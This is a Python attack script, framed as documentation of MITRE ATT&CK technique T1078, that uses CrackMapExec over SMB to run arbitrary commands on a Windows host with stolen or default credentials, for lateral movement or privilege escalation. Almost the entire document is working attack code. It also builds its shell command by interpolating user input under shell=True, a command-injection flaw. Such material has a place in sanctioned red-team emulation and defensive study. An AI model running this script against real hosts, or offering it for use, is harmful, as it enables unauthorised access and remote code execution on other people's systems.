# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1078: Valid Account
# Objective: Involves using legitimate credentials to access a target system. 
# This script demonstrates how to leverage stolen or default credentials for lateral movement or privilege escalation on a Windows target.

#!/usr/bin/env python3
import subprocess
import sys
import argparse
from getpass import getpass

def run_command(command, username=None, password=None, host=None):
    try:
        if username and password and host:
            # Use CrackMapExec for remote execution on a Windows target from Linux
            # The command is 'crackmapexec smb <host> -u <user> -p <pass> -x <command>'
            # We use quotes around the command to handle spaces and special characters.
            cmd = f"crackmapexec smb {host} -u '{username}' -p '{password}' -x '{command}'"
            print(f"[+] Running command on {host} as {username}: {command}")
            print(f"[*] Executing: {cmd}")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        else:
            # Local execution (this part remains the same)
            print(f"[+] Running command locally: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            if result.stdout == "":
                print("CANNOT GET OUTPUT. Port 445 (SMB service) potentially closed")
            else:
                print("[+] Command executed successfully!")
                print(result.stdout)
        else:
            print(f"[-] Error executing command.")
            print(f"[-] Return Code: {result.returncode}")
            print(f"[-] Stderr: {result.stderr}")

    except Exception as e:
        print(f"[-] An unexpected exception occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description="MITRE T1078: Valid Accounts - Credential-Based Attack Script")
    parser.add_argument("--username", help="Username for authentication (e.g., 'Administrator')")
    parser.add_argument("--password", help="Password for authentication (leave blank to prompt)")
    parser.add_argument("--host", help="Target host (e.g., '192.168.1.100')")
    parser.add_argument("--command", help="Command to execute (e.g., 'whoami')")
    args = parser.parse_args()

    # Check for the command first.
    if not args.command:
        print("[-] Error: --command is required!")
        sys.exit(1)

    # Get the password BEFORE using it in a check.
    password = args.password if args.password else getpass("Enter password: ")

    # Safely check the host and credentials.
    if args.host and not (args.username and password):
        print("[-] Error: For remote execution, --host, --username, and --password are required!")
        sys.exit(1)

    run_command(args.command, args.username, password, args.host)

if __name__ == "__main__":
    main()